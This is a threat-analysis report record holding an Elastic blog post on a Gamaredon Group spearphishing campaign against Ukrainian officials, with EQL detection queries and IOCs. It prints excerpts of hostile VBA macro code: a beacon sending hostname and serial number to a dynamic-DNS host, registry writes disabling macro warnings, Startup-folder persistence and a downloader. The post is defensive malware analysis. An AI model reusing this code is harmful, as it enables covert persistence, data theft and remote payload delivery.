{
    "id": "91bb201a-0a77-4289-95df-2da385a1c72c",
    "created_at": "2023-01-12T15:10:18.421608Z",
    "updated_at": "2025-03-27T02:16:39.927135Z",
    "deleted_at": null,
    "sha1_hash": "4b26222dce3683fcfe28867df9cc59ecba9eb678",
    "title": "2020-02-13 - Playing defense against Gamaredon Group",
    "authors": "",
    "file_creation_date": "2022-05-28T19:52:48Z",
    "file_modification_date": "2022-05-28T19:52:48Z",
    "file_size": 636685,
    "plain_text": "# Playing defense against Gamaredon Group\n\n**elastic.co/blog/playing-defense-against-gamaredon-group**\n\nFebruary 13, 2020\n\n**Editor’s Note — August 19, 2020: The Elastic Endpoint Security solution mentioned in this post is**\n[now referred to as Elastic Security. The broader Elastic Security solution delivers endpoint security,](https://www.elastic.co/security)\nSIEM, threat hunting, cloud monitoring, and more. Future mentions of Elastic endpoint security will\nrefer to the specific anti-malware protection that users can enable in Ingest Manager.\n\n\nFor several months, the Intelligence & Analytics team at Elastic Security has tracked an ongoing\nadversary campaign appearing to target Ukranian government officials. Based on our monitoring,\n[we believe Gamaredon Group, a suspected Russia-based threat group, is behind this campaign.](https://attack.mitre.org/groups/G0047/)\nOur observations suggest a significant overlap between tactics, techniques, and procedures (TTPs)\n[included within this campaign and public reporting .1](https://www.anomali.com/files/white-papers/Anomali_Threat_Research-Gamaredon_TTPs_Target_Ukraine-WP.pdf)\n\nThis campaign has produced and deployed updated lures on a near-daily basis that appear to target\nmultiple Ukrainian government departments. With this high operational tempo and aggressive\ntargeting, they consistently employ a cluster of initial access techniques and procedures. Over the\npast four months, these techniques have consisted of spearphishing, remote document template\ninjection, startup folder persistence, VBA/VBScript languages, and Dynamic DNS command &\ncontrol infrastructure.\n\nIn this post, we’ll walk through the campaign details, reviewing the implementation while also\nproviding solutions such as detection strategies through the use of Elastic’s Event Query Language\n(EQL).\n\n\n-----\n\n## Campaign Details\n\n[The earliest identified infrastructure indicates this campaign has been active since August 2019.](https://www.virustotal.com/gui/domain/libre-templates.ddns.net/details)\nThe first [sample leveraging this domain was submitted to VirusTotal in early September 2019.](https://www.virustotal.com/gui/file/481eee236eadf6c947857820d3af5a397caeb8c45791f0bbdd8a21f080786e75/details)\nSpearphishing emails like the example in Figure 1 (below) were used to deliver a malicious\nattachment and demonstrate Gamaredon Group’s attempt to impersonate an anti-corruption activist.\nThis example targeted the National Security and Defense Council of Ukraine and dates to January\n17, 2020.\n\nFigure 1 - Spearphishing email sent to National Security and Defense Council of Ukraine\nA typical lure document might masquerade as an information request to the Ministry of Foreign\nAffairs of Ukraine. These manufactured lures included official logos stolen from governmental offices\nof Ukraine and impersonated diplomats known to their targets.\n\n\n-----\n\nFigure 2 - Lure document - Ministry of Foreign Affairs in Ukraine request\nTo improve their chances of success, they customize the request around the same date of the\ncampaign and include urgent requests for action. These efforts are indicative of necessity.\n\n\n-----\n\nFigure 3 - Lure document - Information request related to NSDC Head of Ukraine\nOften, the call to action first required the victim to open an attached lure document. A user who\nattempted to open one of these malicious attachments would see a perfectly convincing decoy\ndocument, while a sequence of invisible actions occurred behind the screen. These documents end\n[up leveraging a technique known as template injection, a method of loading remotely hosted](https://attack.mitre.org/techniques/T1221/)\nMicrosoft Word document templates.\n\nMicrosoft Word objects function similarly to compressed archives and have properties defined using\nMicrosoft’s Open Office XML (OOXML) format. Within the decompressed `word/_rels/`\nsubdirectory, the file `settings.xml.rels contained a network location where a remotely hosted`\ntemplate was retrieved as depicted in Figure 4.\n\nFigure 4 - Excerpt from Settings.xml.rels\nEach external URL within these lures were configured to point to Dynamic DNS providers (ddns.net,\nhopto.org). Dynamic DNS provides automation around updating a name server in the Domain Name\nSystem (DNS). By adopting this technique, this shows the adversary’s attempt to mask their\nownership and obscure atomic indicator associations through the use of transient infrastructures,\nsuch as Dynamic DNS.\n\n\n-----\n\nFigure 5 - Word startup screen showing download of remote document template\nThe remote templates are macro-enabled, configured to execute VBA macro code that persists a\nVBScript object in the victim’s startup folder as a foothold. We assess the objective of this initial\ncode is used to identify the victim and to protect the second-stage payload that is intended only for\ntheir targeted victims. In the next sections, we will review the document’s metadata and macro code\n[found in a recent sample.](https://www.virustotal.com/gui/file/feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f/details)\n\n## Document metadata analysis\n\nIn malicious campaigns, infrastructure is commonly created for specific targets. This serves multiple\npurposes, but frequently it’s done to track implants and frustrate automated research and analysis.\nAs analysts, this gives us some insight into the adversaries’ maturity, experience, and resources. As\nan example, an adversary who reuses lure documents or templates may be less experienced, not\ninterested in high-value targets, or using monetized infrastructure from previous campaigns.\n\nAnalyzing the metadata from the lure document and template allows us to see when these\nweaponized documents were created, as well as identify any associations between different\nelements of the campaign.\n\nAs we can see in Figure 6, the lure document was created on December 24, 2019 by the Author\n“ШУРИК”. In Figure 7, we can see that the Author is the same as observed in the lure document\n(ШУРИК). Additionally, we can see that the remote template was created on December 12, 2019\nand then modified on December 24, 2019. There were 5 modifications to it, indicating that it has\nbeen used for 5 campaigns in 12 days — or about 2.5 days per campaign. With moderate\nconfidence, this tells us that the remote template is likely reused and updated with new macros for\nnew campaigns, and that they were created by the same Author (or at a minimum, the same\ninstance of Microsoft Word).\n\nAs an analyst note, we see different tool markings that indicate this was created by a Russian\nspeaker (Russian Author, Russian Language Code, Cyrillic character set, and the usage of\nReanimator Extreme Edition). While we can use those as information to help inform overall analysis,\n\n\n-----\n\nthis information can be seeded — so it doesn t prove anything definitively on its own. In this case,\nthis aligns with other open source analysis linking this to the Gamaredon Group, which is believed to\nbe Russian in origin.\n\nFile Size 46 kB\n\nFile Type Extension docx\n\nMIME Type application/vnd.openxmlformatsofficedocument.wordprocessingml.document\n\nLast Modified By ШУРИК\n\nRevision Number 2\n\nCreate Date 2019:12:24 15:58:00Z\n\nModify Date 2019:12:24 16:10:00Z\n\nTemplate pos.dot\n\nTotal Edit Time 2 minutes\n\nPages 1\n\nWords 195\n\nCharacters 1114\n\nApplication Microsoft Office Word\n\nLines 9\n\nParagraphs 2\n\nCompany Reanimator Extreme Edition\n\n\nCharacters With\nSpaces\n\n\n1307\n\n\nFigure 6 - Metadata from the lure document (truncated for length)\n\nFile Size 44 kB\n\nFile Type Extension doc\n\nMIME Type application/msword\n\nLanguage Code Russian\n\nAuthor ШУРИК\n\nTemplate pos.dot\n\nLast Modified By ШУРИК\n\n\n-----\n\nSoftware Microsoft Office Word\n\nCreate Date 2019:12:12 11:48:00\n\nModify Date 2019:12:24 10:30:00\n\nCode Page Windows Cyrillic\n\nCompany Reanimator Extreme Edition\n\nChar Count With Spaces 0\n\nRevision Number 5\n\nTotal Edit Time 0\n\nWords 0\n\nCharacters 0\n\nPages 1\n\nParagraphs 1\n\nLines 1\n\nFigure 7 - Metadata from the remote template (truncated for length)\nWhile we cannot state with any authority, searching for the Author “ШУРИК” has identified similar\nTTPs (lure documents with remote template injection) as far back as September of 2019.\n\n## Macro code analysis\n\nThe macro code was obfuscated using string concatenation and procedurally generated variables\n— techniques that are often used to bypass static detection technologies. Upon execution, this code\nprovides reverse shell functionality that allows an adversary access to the victim’s system and\ncapability to access shared resources on their local network. Figure 8 contains an excerpt of the\nmacro that depicts the creation of a reverse shell and some of the system information collected\nautomatically.\n```\nDim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"\"WSc\" + \"ri\" + \"pt.S\" + \"hel\" + \"l\"\")\"\nSet PWFJWatF = CreateObject(\"WScr\" + \"ipt.Ne\" + \"two\" + \"rk\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Sc\" + \"rip\" + \"ting.Fi\" + \"leSy\" + \"stemOb\" + \"ject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"Syst\" + \"emDri\" + \"ve\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n\n```\nFigure 8 - First 7 lines of macro code from the loaded document template\nFigure 9 shows an excerpt of the same code removing the concatenation.\n\n\n-----\n\n```\nDim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"WScript.Shell\")\"\nSet PWFJWatF = CreateObject(\"WScript.Network\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Scripting.FileSystemObject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"SystemDrive\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n\n```\nFigure 9 - First 7 lines of macro code - Removal of concatenation\nThe serial number and hostname of the victim's computer are some of the first pieces of information\nthe VBA collects. They are converted to hexadecimal and included in the reverse shell HTTP\nrequest to identify both the implant and the victim. Figure 10 shows off the configuration of the URI\nrequest within the macro and Figure 11 represents an example URI.\n```\nJzESywut = \"h\" + \"tt\" + \"p:\" + \"//l\" + \"ibcr\" + \"ash.dd\" + \"ns.ne\" + \"t/\" & OYTgBXAP & \"_\" &\nHFzesifc & \"//po\" + \"sol\" + \"re\" + \"boo\" + \"t.ph\" + \"p\"\n\n```\nFigure 10 - URI request configuration - Macro\n```\nJzESywut = hxxp://libcrash.ddns[.]net/ENDPOINT1_96L02G3D//posolreboot.php\n\n```\nFigure 11 - URI request configuration - Example\nBy default, Microsoft disables external or untrusted macros by setting key values in the registry at\n```\nHKCU\\Software\\Microsoft\\Office\\(VERSION)\\Word\\Security\\ . The first registry modification\n\n```\nmade by this macro changes the key value of `AccessVBOM to 1, effectively bypassing the default`\nsetting to enable external or untrusted macros. The second registry modification enables all macros\nautomatically and disables warnings for future macro-enabled objects. Figure 12 represents the\nmacro code for these registry modifications.\n```\nFEDzCjgi$ = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\" & Application.Version &\n_\"\\Word\\Security\\\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ & \"AccessVBOM\", 1, \"REG_DWORD\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ & \"VBAWarnings\", 1, \"REG_DWORD\"\n\n```\nFigure 12 - Registry modifications found in macro\nThe remaining lines of code end up writing a VBScript file and placing it in the user’s startup\ndirectory. Figure 13 contains an excerpt of the beginning lines of macro code where the VBScript\n(security.vbs) is written to disk and placed in the startup folder.\n```\nDim LISPVdZd As Object\nSet LISPVdZd = GGZucIZE.CreateTextFile(FESHWDaD + \"\\Mi\" + \"croso\" + \"ft\\Wi\" + \"ndow\" +\n\"s\\St\" + \"art Men\" + \"u\\Pro\" + \"grams\\Sta\" + \"rtup\\secur\" + \"ity.v\" + \"b\" + \"s\", True, True)\n\n```\nFigure 13 - Macro code writing VBScript file (security.vbs)\nUpon rebooting or successfully authenticating to an infected system, the persistent VBScript file is\nautomatically executed and a standard HTTP GET is made with the previously observed URI\n(Figure 14). If the request is successful, the response body gets stored into another variable. This\nfunctionality appears to serve as a downloader that has specific subroutine instructions for\nreassembling a binary on disk. Figure 14 contains an excerpt of the function used to construct the\nHTTP GET request.\n\n\n-----\n\n```\nFunction TOGeMFBD(iWotBBKf)\nOn Error Resume Next\nSet EXJJrRlN = CreateObject(\"MSXML2.XMLHTTP\")\nWith EXJJrRlN\n.Open \"GET\", iWotBBKf, False\n.send\nEnd With\nIf EXJJrRlN.Status = 200 Then\nTOGeMFBD = EXJJrRlN.ResponseBody\nEnd If\nEnd Function\n\n```\nFigure 14 - GET request (security.vbs)\nDuring dynamic analysis, analysts identified that the script enters a loop while sending the request.\nA 0-byte file is created under the infected user’s roaming profile with a procedurally generated file\nname and text file extension. The file is iteratively written and deleted without the contents changing.\n\nAnalysts have not confirmed the purpose of this file, and suspect it is used to reassemble a\nsegmented later-stage implant. Potential reasons to obfuscate this process include evading\ndetection and response solutions.\n\n## Pteranodon update\n\nWhile doing this research, we observed samples and artifacts that appear to be related to an\n[updated version of the Gamaredon Group’s custom backdoor, known as Pteranodon. Although we](https://attack.mitre.org/software/S0147/)\ndon’t have substantial evidence that Pteranodon is the final payload victims are infected with during\nthis campaign, we assess with moderate confidence that this activity is linked to Gamaredon Group.\n\nThree PE samples were uploaded to VirusTotal last month with each dropping two text files\n[(ExcelMyMacros.vba,](https://www.virustotal.com/gui/file/c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e/details) [wordMacros.vba). The two text files share several similarities to the VBA](https://www.virustotal.com/gui/file/02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d/details)\nmacro code found in the remote templates used in this campaign — specifically, the methods of\nretrieving and hex-encoding the serial number and similar subroutine logic. Figure 15 depicts the\nVBA macro code from the remote template on the left and the dropped VBA macro code from a\nknown Pteranodon implant on the right.\n\n**VBA from Campaign**\n```\nFor LfJesrvH = 0 To UBound( IvAPFGDD )\" + vbCrLf\nLISPVdZd.Write \"IvAPFGDD(LfJesrvH) = Asc( Mid( EaCJFwPc, LfJesrvH + 1, 1 ) )\" + vbCrLf\nLISPVdZd.Write \"Next\" + vbCrLf\nLISPVdZd.Write \"GetFEDzCjgi = IvAPFGDD\" + vbCrLf\n\n```\n**VBA from Pteranodon**\n```\nFor i = 0 To UBound( asrrCodes )\" + vbCrLf\nNewVDJKpCBSFile.Write \"  asrrCodes(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )\" + vbCrLf\nNewVDJKpCBSFile.Write \" Next\" + vbCrLf\nNewVDJKpCBSFile.Write \" GetKey = asrrCodes\" + vbCrLf\n\n```\nFigure 15 - Macro comparison - VBA from Campaign (top) vs VBA from Pteranodon (bottom)\nBoth text files contained VBA, and had the same functionality for disabling macro warnings, creating\na persistent VBScript in the startup folder and establishing connections to C2. What’s interesting\nwith the dropped text files (VBA), is that they show the true variable names used by the developers\n\n\n-----\n\nbefore their tooling obfuscates the variables. At the time of this writing, each of the four C2 servers\n(see attached indicators) affiliated with Pteranodon samples were currently active and hosted a\nnetwork allocated to ASN9123 (TIMEWEB LTD). Macro code associated with the Gamaredon Group\ncampaign targeting Ukraninan officials called back to C2 hosted in the same network.\n\nAn interesting change in some of these artifacts appears to be the adoption of .NET. Along with the\ntwo text files containing VBA code, there are three dropped DLL’s (Microsoft.Office.Interop.Excel.dll,\n[Microsoft.Office.Interop.Word.dll, Microsoft.Vbe.Interop.dll) and a .NET sample showing](https://www.virustotal.com/gui/file/145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd/details)\ndependencies with these files. Figure 16 shows a hex-encoded reference to one of the VBA files\n(wordMacros.txt). Based on these observations, it’s intriguing to see Gamaredon Group continue to\nleverage core functionality of their VBA stager code, but in a new method of execution by using\n.NET\n\nFigure 16 - .NET reference to “wordMacros.txt”\n\n## Detection crafting\n\nFor organizations interested in detecting TTPs discussed in this blog post, detection logic has been\nprovided for the following categories:\n\n### Dynamic DNS\n\n[Dynamic DNS enables adversaries to rapidly provision very large numbers of records that map back](https://attack.mitre.org/techniques/T1311/)\nto their infrastructure, creating a confusion layer between victims and adversaries. Gamaredon\nGroup exclusively used Dynamic DNS locations for remotely hosted templates, rotating domains\nconsistently, and leveraging separate infrastructure for hosting stagers and templates.\n\nProfiling Dynamic DNS for your enterprise is an amazing way to get started hunting — not just to\nbaseline and build environmental awareness, but also to outright find evil. We will primarily focus on\nthe two Dynamic DNS providers observed in relation to this campaign, but feel free to extend your\n[profiling of providers by reviewing this extensive post from the Cisco team. If you need inspiration,](https://umbrella.cisco.com/blog/2013/04/15/on-the-trail-of-malicious-dynamic-dns-domains/)\nconsider counting up all non-browser processes that made a DNS request to one of these Dynamic\nDNS providers as shown in Figure 17.\n```\ndns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\") and \n  process_name not in (\"chrome.exe\",\"iexplore.exe\", \"firefox.exe\")\n| count process_name, query_name\n\n```\nFigure 17 - EQL Query - Count of non-browser process to dynamic DNS providers\nAnother option examines the processes that most frequently communicate with these providers, and\nmay provide more context regarding how dynamic DNS is used in your environment, or enable an\nanalyst to find signs of other malicious activity.\n\n\n-----\n\n```\nnetwork where event of \n  [dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")\n| count process_name, total_in_bytes, total_out_bytes\n\n```\nFigure 18 - EQL query - Network traffic of processes to dynamic DNS providers\n\n### Template Injection\n\n[Spearphishing attachments that utilize template injection may bypass security controls because they](https://attack.mitre.org/techniques/T1221/)\ncontain no embedded VBA code. The attached document retrieves a remotely hosted template\nwhere the malicious VBA code resides. In order to detect this activity dynamically, analyze DNS and\nnetwork traffic over common protocols (HTTP/HTTPS/SMB) and processes generated by Microsoft\nOffice applications. Enterprise defenders may need to whitelist any legitimate use of remotely\nhosted templates, or any benign network activity to Microsoft infrastructure. Below is an example\nEQL query focused on new process creation events from Office products that also made DNS\nrequests outside our whitelist.\n```\nsequence by unique_pid\n  [process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n  [dns where not wildcard(query_name, \"*.microsoft.com\", \"*.skype.com\")]\n\n```\nFigure 19 - EQL query - DNS traffic from Office applications\nSome enhancements we can use with the previous query is to add a network event to the sequence\nas well as look for a spawned child process bringing in more context to the detection.\n```\nsequence\n  [process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")] by\nunique_pid \n  [dns where not wildcard(query_name, \"*.microsoft.com\", \"*.skype.com\")] by unique_pid \n  [network where true] by unique_pid \n  [process where subtype.create] by unique_ppid\n\n```\nFigure 20 - EQL query - Network traffic making dynamic DNS requests from Office applications\nIf we wanted to tailor a sequence-based detection to the Gamaredon Group activity specifically, we\ncan bring in the previous Dynamic DNS providers, which creates a more restrictive filter.\n```\nsequence by unique_pid\n  [process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n  [network where event of\n    [dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")]]\n\n```\nFigure 21 - EQL query - Network traffic making dynamic DNS requests from Office applications\nAcross a range of features provided by the Elastic Endpoint, this attack is prevented through\ndifferent machine-learning technologies to stop advanced threats such as macro-enabled\ndocuments and malicious binaries. Along with these protections, we can take nearly any EQL logic\nand deploy it in prevention mode to completely stop an attack such as in this example with the\ndownload and execution of the remote template. Here’s a short clip in action:\n\n\n-----\n\n### Malicious registry configuration\n\nIn order for adversaries to be effective in their mission, they often create their own opportunities. In\nthis case, the adversary reconfigured the target endpoint in order to disable macro security warnings\nand trust future macros automatically. These small changes can end up having larger implications,\nand defenders can look for them as symptoms of more serious security issues. For example, these\n[same techniques have also been associated with threat groups like APT32 and are leveraged by](https://blog.telsy.com/oceanlotus-on-asean-affairs/)\n[malware families such as AgentTesla and](https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr.html) [BabyShark.](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/)\n\nThis query looks for evidence of the registry modifications that disable warnings for macros and\nautomatically enabling future macros:\n```\nregistry where registry_data == 1 and wildcard(registry_path,\n  \"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\", \n  \"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")\n\n```\nFigure 22 - EQL query - Registry modifications around disabling macro security features\nThat would function perfectly well as a standalone detection, but EQL allows us to look for both the\nregistry modification and template injection techniques in this example query:\n```\nsequence by unique_pid\n  [process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n  [registry where registry_data == 1 and wildcard(registry_path,\n    \"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\", \n    \"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")]\n  [registry where registry_data == 1 and wildcard(registry_path,\n    \"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\AccessVBOM\", \n    \"*\\\\Software\\\\Microsoft\\\\Office\\\\*\\\\Word\\\\Security\\\\VBAWarnings\")]\n\n```\nFigure 23 - EQL query - Registry modifications around disabling macro security features\n\n\n-----\n\n### Persistence startup\n\nGamaredon Group leveraged both malicious Windows shortcut files and script objects written to the\n[Startup folder for persistence. This technique is very effective in spite of its simplicity and continues](https://attack.mitre.org/techniques/T1060/)\nto be popular among adversaries. One of the first places to start building detection logic would be to\ninquire about processes that write files to the startup folder.\n```\nfile where subtype.create\n and (\n  file_path == \"*\\\\Programs\\\\Startup\\\\*.lnk\" or\n  file_path == \"*\\\\Programs\\\\Startup\\\\*.vbs\"\n  )\n| count process_name, file_path, user_name\n\n```\nFigure 24 - EQL query - Monitoring file writes to startup folder\nTo take it a bit further, we can also customize detection logic to include the VBScript execution at\nlogon. This is a great example for building a sequenced-based signal, as we will track the\nadversary’s activity over an extended period of time — such as 90 days. Once the machine is\nrebooted or the user logs back in, an alert can be generated when WScript executes the VBScript\nfile at startup.\n```\nsequence with maxspan=90d\n [file where subtype.create and file_path == \"*\\\\Programs\\\\Startup\\\\*.vbs\"]\n [process where subtype.create and parent_process_name==\"explorer.exe\" and\n   process_name == “wscript.exe” and command_line == \"*\\\\Programs\\\\Startup\\\\*\"]\n\n```\nFigure 25 - EQL query - Monitoring execution of startup processes\n\n## Conclusion\n\nIn this post, we reviewed recent campaign TTPs tied to an adversary known publicly as Gamaredon\n[Group. This group is likely to have been active since at least 2013 and has engaged in an ongoing2](https://www.lookingglasscyber.com/wp-content/uploads/2015/08/Operation_Armageddon_Final.pdf)\ncampaign against Ukraine at the time of this writing. We highlighted some of their current techniques\nsuch as template injection and the use of Dynamic DNS providers, the macro code found in a recent\n[sample, and updates to their custom backdoor known as Pteranodon. By using EQL, we also](https://www.elastic.co/blog/introducing-event-query-language)\nshared hunting and detection strategies around four specific techniques used by Gamaredon Group.\n\nWe hope that by sharing some of these insights and queries, we can help raise awareness and\ncontinue to focus on protecting the world's data from attacks. To enable organizations further, we’ve\nadded all the Indicators of Compromise (IOCs) below and added the queries in this post into the\n[EQLLib repository.](https://eqllib.readthedocs.io/en/latest/analytics.html)\n\nInterested in using Elastic Security? Try [Elastic SIEM for free.](https://www.elastic.co/siem)\n\nPlus, [EQL support is being added to Elasticsearch!](https://github.com/elastic/elasticsearch/issues/49581)\n\n## Indicators of Compromise (IOCs)\n\n\nLure Document\nSHA-256\n\n\n86e0701349903105b0c346df9485dd59d85dd9463c2bee46d974ea1b1d7059d4\n\n\n-----\n\nRemote Template\n(pos.dot) SHA-256\n\nRemote Template\nfrom Lure\nDocument Domain\n\nRemote Template\nHosting IP\n\nRemote Template\nHosting IP\n\nSystem Information\nUpload IP\n\nSystem Information\nUpload URI\n\nExcelMyMacros.vba\nSHA-256\n\nwordMacros.vba\nSHA-256\n\nExcelMyMacros.txt\nSHA-256\n\nPteranodon SHA256\n\nPteranodon SHA256\n\n\nfeb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f\n\ndocument-out[.]hopto[.]org/pos[.]dot\n\n141[.]8[.]195[.]60\n\n141[.]8[.]192[.]153\n\n188[.]225[.]25[.]50\n\nlibcrash.ddns[.]net/{Computername_SerialNumber}//posolreboot.php\n\nc4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e\n\n02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d\n\n2f310c5b16620d9f6e5d93db52607f21040b4829aa6110e22ac55fab659e9fa1\n\nc1524a4573bc6acbe59e559c2596975c657ae6bbc0b64f943fffca663b98a95f\n\n145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd\n\n\nPteranodon Domain beercraft[.]space\n\nPteranodon Domain skymage[.]fun\n\nPteranodon Domain masseffect[.]space\n\nPteranodon Domain masseffect[.]website\n\nPteranodon IP 185[.]200[.]241[.]88\n\nPteranodon IP 188[.]225[.]46[.]94\n\n## References\n\n**We're hiring**\n\nWork for a global, distributed team where finding someone like you is just a Zoom meeting\naway. Flexible work with impact? Development opportunities from the start?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-13 - Playing defense against Gamaredon Group.pdf"
    ],
    "report_names": [
        "2020-02-13 - Playing defense against Gamaredon Group.pdf"
    ],
    "threat_actors": [
        {
            "id": "81bd7107-6b2d-45c9-9eea-1843d4b9b308",
            "created_at": "2022-10-25T15:50:23.320841Z",
            "updated_at": "2025-03-27T02:00:55.441723Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Gamaredon Group",
                "IRON TILDEN",
                "Primitive Bear",
                "ACTINIUM",
                "Armageddon",
                "Shuckworm",
                "DEV-0157",
                "Aqua Blizzard"
            ],
            "source_name": "MITRE:Gamaredon Group",
            "tools": [
                "QuietSieve",
                "Pteranodon",
                "PowerPunch"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d5156b55-5d7d-4fb2-836f-861d2e868147",
            "created_at": "2023-01-06T13:46:38.557326Z",
            "updated_at": "2025-03-27T02:00:02.861124Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Aqua Blizzard",
                "Actinium",
                "DEV-0157",
                "Blue Otso",
                "G0047",
                "PRIMITIVE BEAR",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder",
                "ACTINIUM",
                "BlueAlpha",
                "IRON TILDEN"
            ],
            "source_name": "MISPGALAXY:Gamaredon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61940e18-8f90-4ecc-bc06-416c54bc60f9",
            "created_at": "2022-10-25T16:07:23.659529Z",
            "updated_at": "2025-03-27T02:02:09.912404Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Actinium",
                "Aqua Blizzard",
                "Armageddon",
                "Blue Otso",
                "BlueAlpha",
                "Callisto",
                "DEV-0157",
                "Iron Tilden",
                "Operation STEADY#URSA",
                "Primitive Bear",
                "SectorC08",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder"
            ],
            "source_name": "ETDA:Gamaredon Group",
            "tools": [
                "Aversome infector",
                "BoneSpy",
                "DessertDown",
                "DilongTrash",
                "DinoTrain",
                "EvilGnome",
                "FRAUDROP",
                "Gamaredon",
                "GammaDrop",
                "GammaLoad",
                "GammaSteel",
                "Gussdoor",
                "ObfuBerry",
                "ObfuMerry",
                "PlainGnome",
                "PowerPunch",
                "Pteranodon",
                "Pterodo",
                "QuietSieve",
                "Remote Manipulator System",
                "Resetter",
                "RuRAT",
                "SUBTLE-PAWS",
                "UltraVNC"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "236a8303-bf12-4787-b6d0-549b44271a19",
            "created_at": "2024-06-04T02:03:07.966137Z",
            "updated_at": "2025-03-27T02:05:17.410356Z",
            "deleted_at": null,
            "main_name": "IRON TILDEN",
            "aliases": [
                "Aqua Blizzard ",
                "Armageddon",
                "Blue Otso ",
                "BlueAlpha ",
                "Dancing Salome ",
                "Gamaredon",
                "Gamaredon Group",
                "Hive0051 ",
